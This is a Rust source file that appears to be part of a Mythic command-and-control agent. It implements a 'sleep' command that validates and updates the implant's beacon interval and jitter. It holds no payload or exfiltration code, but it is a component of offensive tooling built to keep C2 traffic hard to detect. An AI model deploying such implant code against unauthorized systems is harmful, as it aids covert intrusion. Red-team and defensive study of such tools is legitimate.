use crate::agent::AgentTask;
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::error::Error;

/// Arguments for the sleep command
#[derive(Deserialize, Serialize)]
struct SleepArgs {
    /// New sleep interval in seconds
    interval: u64,
    /// New jitter percentage (0-100)
    jitter: Option<u64>,
}

/// Set the sleep interval and jitter for the agent
/// * `task` - Task information from Mythic
/// * `sleep_interval` - Mutable reference to the sleep interval
/// * `jitter` - Mutable reference to the jitter value
pub fn set_sleep(
    task: &AgentTask,
    sleep_interval: &mut u64,
    jitter: &mut u64,
) -> Result<serde_json::Value, Box<dyn Error>> {
    // Parse the arguments
    let args: SleepArgs = serde_json::from_str(&task.parameters)?;

    // Validate the interval (minimum 1 second, maximum 1 day)
    if args.interval < 1 || args.interval > 86400 {
        return Ok(json!({
            "task_id": task.id,
            "status": "error",
            "user_output": "Sleep interval must be between 1 and 86400 seconds",
            "completed": true,
        }));
    }

    // Validate jitter if provided
    if let Some(j) = args.jitter {
        if j > 100 {
            return Ok(json!({
                "task_id": task.id,
                "status": "error",
                "user_output": "Jitter must be between 0 and 100 percent",
                "completed": true,
            }));
        }
        *jitter = j;
    }

    // Update the sleep interval
    let old_interval = *sleep_interval;
    *sleep_interval = args.interval;

    let message = if let Some(j) = args.jitter {
        format!(
            "Sleep interval updated from {} to {} seconds with {}% jitter",
            old_interval, args.interval, j
        )
    } else {
        format!(
            "Sleep interval updated from {} to {} seconds with {}% jitter",
            old_interval, args.interval, *jitter
        )
    };

    Ok(json!({
        "task_id": task.id,
        "status": "success",
        "user_output": message,
        "completed": true,
    }))
}
